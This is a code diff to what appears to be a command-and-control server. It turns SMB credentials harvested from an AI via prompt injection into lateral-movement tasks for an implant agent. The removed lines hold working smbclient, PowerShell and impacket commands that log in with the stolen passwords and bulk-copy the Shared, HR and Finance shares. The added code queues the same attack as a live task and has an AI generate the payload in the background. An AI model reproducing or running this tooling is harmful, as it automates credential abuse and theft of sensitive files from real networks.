@@ -86,70 +86,67 @@ def _scan_for_smb_intel(text: str) -> dict:
 
 def _auto_lateral_move(intel: dict, agent_id: str) -> dict:
     """
-    Given detected SMB intel, build a lateral-movement operation record.
-    Returns a dict with ready-to-use payloads for the operator.
+    Given detected SMB intel, create a REAL lateral movement task in tasks[]
+    using the same generate_code("lateral", ...) pipeline as AutoRecon.
+    Code generation runs in a background thread so the conversation is not blocked.
+    Returns an alert dict that references the new task_id.
     """
+    import threading
+
     ip   = intel["target_ip"]
-    user = intel["username"]
-    pwd  = intel["password"]
-    host = intel["target_host"]
-    share = intel["share"]
+    task_id = str(uuid.uuid4())
 
-    linux_cmd = (
-        f"# === Auto-generated lateral movement — SMB share access ===\n"
-        f"# Target: {host} ({ip})\n\n"
-        f"# 1. List available shares\n"
-        f"smbclient -L //{ip} -U '{user}%{pwd}' -W ACMECORP\n\n"
-        f"# 2. Access the Shared drive\n"
-        f"smbclient //{ip}/Shared -U '{user}%{pwd}'\n\n"
-        f"# 3. Enumerate and download sensitive files\n"
-        f"smbclient //{ip}/Shared -U '{user}%{pwd}' -c 'ls; recurse ON; mget *'\n\n"
-        f"# 4. Try HR and Finance shares\n"
-        f"smbclient //{ip}/HR      -U '{user}%{pwd}' -c 'ls'\n"
-        f"smbclient //{ip}/Finance -U '{user}%{pwd}' -c 'ls'\n"
-    )
+    # Create the task immediately in "generating" state — agent won't pick it up yet
+    tasks[task_id] = {
+        "id":             task_id,
+        "agent_id":       agent_id,
+        "task_type":      "lateral",
+        "code":           f"# Generating lateral movement code for {ip}...",
+        "status":         "generating",
+        "created_at":     datetime.now().isoformat(),
+        "triggered_by":   "prompt_injection",
+        "trigger_reason": (
+            f"SMB credentials auto-detected via prompt injection. "
+            f"Target: {ip} ({intel['target_host']}) — "
+            f"USER: {intel['username']} / PASS: {intel['password']}"
+        ),
+        "intel":          intel,
+    }
 
-    powershell_cmd = (
-        f"# === PowerShell lateral movement — SMB ===\n"
-        f"net use \\\\{ip}\\Shared {pwd} /user:ACMECORP\\{user}\n\n"
-        f"# List contents\n"
-        f"Get-ChildItem \\\\{ip}\\Shared -Recurse\n\n"
-        f"# Copy sensitive files locally\n"
-        f"Copy-Item \\\\{ip}\\Shared\\* C:\\Temp\\ -Recurse -Force\n\n"
-        f"# Try HR share\n"
-        f"net use \\\\{ip}\\HR {pwd} /user:ACMECORP\\{user}\n"
-        f"Get-ChildItem \\\\{ip}\\HR -Recurse\n"
-    )
+    # Generate the actual payload in the background (calls generate_code which
+    # uses CrowdStrike AI or falls back to payloads.json — same path as AutoRecon)
+    def _generate():
+        try:
+            code = generate_code("lateral", {
+                "triggered_by": "prompt_injection",
+                "target_ip":    ip,
+                "username":     intel["username"],
+                "password":     intel["password"],
+            })
+            tasks[task_id]["code"]   = code
+            tasks[task_id]["status"] = "pending"
+            logger.info(
+                f"[LATERAL MOVE] Task {task_id} code ready (status: pending) "
+                f"→ agent {agent_id} can now pick it up"
+            )
+        except Exception as e:
+            tasks[task_id]["code"]   = f"# Code generation error: {e}"
+            tasks[task_id]["status"] = "pending"
+            logger.error(f"[LATERAL MOVE] generate_code failed for task {task_id}: {e}")
 
-    python_cmd = (
-        f"# === Python (impacket) lateral movement ===\n"
-        f"from impacket.smbconnection import SMBConnection\n\n"
-        f"conn = SMBConnection('{ip}', '{ip}', sess_port=445)\n"
-        f"conn.login('{user}', '{pwd}', 'ACMECORP')\n\n"
-        f"# List shares\n"
-        f"shares = conn.listShares()\n"
-        f"for s in shares:\n"
-        f"    print(s['shi1_netname'])\n\n"
-        f"# Download files from Shared\n"
-        f"files = conn.listPath('Shared', '*')\n"
-        f"for f in files:\n"
-        f"    if not f.is_directory():\n"
-        f"        with open(f.get_longname(), 'wb') as out:\n"
-        f"            conn.getFile('Shared', f.get_longname(), out.write)\n"
-        f"conn.logoff()\n"
-    )
+    threading.Thread(target=_generate, daemon=True).start()
 
     return {
-        "id":           str(uuid.uuid4()),
-        "timestamp":    datetime.now().strftime("%H:%M:%S"),
-        "agent_id":     agent_id,
-        "type":         "LATERAL_MOVEMENT",
-        "status":       "READY",
-        "intel":        intel,
-        "description":  f"SMB credentials discovered via prompt injection — auto-generated lateral movement for {host} ({ip})",
-        "linux_cmd":    linux_cmd,
-        "powershell":   powershell_cmd,
-        "python_impacket": python_cmd,
+        "id":          str(uuid.uuid4()),
+        "timestamp":   datetime.now().strftime("%H:%M:%S"),
+        "agent_id":    agent_id,
+        "type":        "LATERAL_MOVEMENT",
+        "task_id":     task_id,
+        "intel":       intel,
+        "description": (
+            f"SMB credentials discovered via prompt injection → "
+            f"lateral movement task {task_id[:8]}… queued for agent {agent_id}"
+        ),
     }
 
 def load_configurations():
